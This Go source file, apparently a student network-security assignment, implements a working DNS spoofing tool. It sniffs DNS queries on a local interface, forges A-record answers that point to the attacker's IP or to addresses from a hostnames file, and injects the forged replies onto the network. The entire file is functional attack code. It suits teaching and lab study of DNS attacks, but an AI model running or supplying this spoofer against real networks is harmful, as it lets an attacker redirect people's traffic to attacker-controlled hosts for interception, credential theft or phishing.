// Minqi Shi
// 111548035
// References:
// And there are other references in the code
// 	https://pkg.go.dev/github.com/google/gopacket/
// 	https://pkg.go.dev/github.com/google/gopacket/pcap
// 	https://golang.org/doc/
//  https://pkg.go.dev/github.com/google/gopacket@v1.1.19/pcap
//  https://github.com/google/gopacket/blob/master/examples/arpscan/arpscan.go
package main

import (
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
	"unicode"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// The function GetOutboundIP() is taken from the following website
// https://stackoverflow.com/questions/23558425/how-do-i-get-the-local-ip-address-in-go
// Get preferred outbound ip of this machine
func GetOutboundIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

func main() {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("", r)
		}
	}()
	// fmt.Println("Hello world!")
	argv := os.Args[1:]      // Argument vector
	argv_length := len(argv) // Length of the arguments

	// fmt.Printf("Argument vector: %v\n", argv)
	// fmt.Printf("Vector Length: %v\n", argv_length)

	var (
		inter_face string = "-1"
		filepath   string = "-1"
		// str         string = "-1"
		expr        []string
		expr_string string
		optind      int    = 0
		current_ip  net.IP = GetOutboundIP()
	)
	hostnames := make(map[string]string)

	for i := 0; i < argv_length; i = i + 2 {
		var opt string = argv[i]
		if opt[0] != '-' {
			continue
		}
		optind += 2
		switch opt {
		// Interface
		case "-i":
			{
				if inter_face != "-1" {
					fmt.Println("Multiple interfaces provided!")
					return
				}
				if i+1 == argv_length {
					fmt.Println("Missing arguments!")
					return
				}
				inter_face = argv[i+1]
				fmt.Println("Interface:", inter_face)
			}
		// Host names
		case "-f":
			if filepath != "-1" {
				fmt.Println("Multiple files provided!")
				return
			}
			if i+1 == argv_length {
				fmt.Println("Missing arguments!")
				return
			}
			filepath = argv[i+1]
		// 	// fmt.Println("File:", filepath)
		default:
			fmt.Println("Unrecognized command!")
			return
		}
	}
	if optind < argv_length {
		expr = argv[optind:]
		// fmt.Printf("Expr: %v\n", expr)
	}
	if len(expr) != 0 {
		for i := 0; i < len(expr); i++ {
			expr_string += expr[i]
			if i != len(expr)-1 {
				expr_string += " "
			}
		}
		if strings.Index(expr_string, "udp") == -1 {
			expr_string += " and udp"
		}
		if strings.Index(expr_string, "dst port 53") == -1 {
			expr_string += " and dst port 53"
		}
		if strings.Index(expr_string, "not src") == -1 {
			expr_string += " and not src " + current_ip.String()
		}

		// fmt.Printf("Expr String: %v\n", expr_string)
	} else {
		// expr_string = "udp dst port 53"
		expr_string = "udp and dst port 53 and not src " + current_ip.String()
		// expr_string = ""
	}

	// fmt.Printf("Expr String: %v\n", expr_string)
	//https://www.devdungeon.com/content/packet-capture-injection-and-analysis-gopacket
	if inter_face == "-1" {
		devices, err := pcap.FindAllDevs()
		if err != nil {
			panic(err)
		}
		inter_face = devices[0].Name
	}

	//https://pkg.go.dev/github.com/google/gopacket@v1.1.19/pcap
	// If there is a hostname file, read from it and add all the pairs to the map
	if filepath != "-1" {
		dat, err := ioutil.ReadFile(filepath)
		if err != nil {
			panic(err)
		}
		// fmt.Print(string(dat))
		dat_content := strings.Split(string(dat), "\n")
		f := func(c rune) bool {
			return unicode.IsSpace(c)
		}
		// fmt.Println((dat_content[1]))
		// r, _ := regexp.Compile("( |\t)?")
		for i := 0; i < len(dat_content); i++ {
			pair := strings.FieldsFunc(dat_content[i], f)
			if len(pair) == 1 || len(pair) > 2 {
				err = errors.New("There are incorrect hostname ip pair in the hostnames files!")
				panic(err)
			}
			if len(pair) == 0 {
				continue
			}
			hostnames[pair[1]] = pair[0]
		}
		// live cap
	}
	// fmt.Println((hostnames))
	if handle, err := pcap.OpenLive(inter_face, 1600, true, pcap.BlockForever); err != nil {
		panic(err)
	} else if err := handle.SetBPFFilter(expr_string); err != nil { // BPF
		panic(err)
	} else {
		defer handle.Close()
		fmt.Println("Listening on " + inter_face + " [" + expr_string + "]")
		// packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		// for packet := range packetSource.Packets() {
		// 	printPacketInfo(packet, hostnames)
		// }

		// https://github.com/troyxmccall/gogospoofdns/blob/master/spoof.go
		// The follwoing steps are inspired from the above website
		var (
			ethLayer      layers.Ethernet
			ipv4Layer     layers.IPv4
			udpLayer      layers.UDP
			dnsLayer      layers.DNS
			decodedLayers []gopacket.LayerType          = make([]gopacket.LayerType, 0, 4)
			decoder       *gopacket.DecodingLayerParser = gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
			query         layers.DNSQuestion
			answer        layers.DNSResourceRecord
			outbuf        gopacket.SerializeBuffer = gopacket.NewSerializeBuffer()
			serialOpts                             = gopacket.SerializeOptions{
				FixLengths:       true,
				ComputeChecksums: true,
			}
		)

		answer.Class = layers.DNSClassIN
		answer.Type = layers.DNSTypeA
		answer.TTL = 600

		for {
			packetData, _, err := handle.ZeroCopyReadPacketData()
			if err != nil {
				panic(err)
			}
			fmt.Println("-------------------------------------")

			if err = decoder.DecodeLayers(packetData, &decodedLayers); err != nil {
				fmt.Print("There is a decoding error: ")
				fmt.Println(err)
				continue
			}

			if len(decodedLayers) != 4 {
				// fmt.Println("The number of layers is not 4!")
				continue
			}

			answer_ip := current_ip

			if dnsLayer.QR {
				// fmt.Println("Not an query! Stop proceeding and go back to wait...")
				continue
			} else {
				// Set to response
				dnsLayer.QR = true
			}

			if len(hostnames) != 0 {
				is_found := false
				for i := uint16(0); i < dnsLayer.QDCount; i++ {
					qname := string(dnsLayer.Questions[i].Name)
					if hostnames[qname] != "" {
						fmt.Println(string(dnsLayer.Questions[i].Name))
						ip := net.ParseIP(hostnames[qname])
						answer_ip = ip
						is_found = true
						break
					}
				}
				if !is_found {
					// fmt.Println("Not a targeted hostname! Go back to wait...")
					continue
				}
			}

			if dnsLayer.RD {
				dnsLayer.RA = true
			}

			for i := uint16(0); i < dnsLayer.QDCount; i++ {
				query = dnsLayer.Questions[i]
				if !(query.Type == layers.DNSTypeA && query.Class == layers.DNSClassIN) {
					continue
				}
				msg := fmt.Sprint(ipv4Layer.SrcIP) + "." + fmt.Sprint(udpLayer.SrcPort) + " > "
				msg += fmt.Sprint(ipv4Layer.DstIP) + "." + fmt.Sprint(udpLayer.DstPort)
				msg += " " + fmt.Sprint(dnsLayer.ID) + "+ " + query.Type.String() + "?"
				msg += " " + string(query.Name)
				fmt.Println(msg)

				answer.Name = query.Name
				answer.IP = answer_ip
				dnsLayer.Answers = append(dnsLayer.Answers, answer)
				dnsLayer.ANCount = dnsLayer.ANCount + 1

			}

			// Swap MAC, IP, ports
			var ethMac_holder net.HardwareAddr = ethLayer.SrcMAC
			var ipv4Addr_holder net.IP = ipv4Layer.SrcIP
			var udpPort_holder layers.UDPPort = udpLayer.SrcPort

			ethLayer.SrcMAC = ethLayer.DstMAC
			ethLayer.DstMAC = ethMac_holder

			ipv4Layer.SrcIP = ipv4Layer.DstIP
			ipv4Layer.DstIP = ipv4Addr_holder

			udpLayer.SrcPort = udpLayer.DstPort
			udpLayer.DstPort = udpPort_holder

			// checksum
			if err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer); err != nil {
				panic(err)
			}
			if err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer); err != nil {
				panic(err)
			}
			// fmt.Println(outbuf)
			if err = handle.WritePacketData(outbuf.Bytes()); err != nil {
				panic(err)
			}

			fmt.Println("Fake response sent to " + string(answer.Name))
		}
	}

}
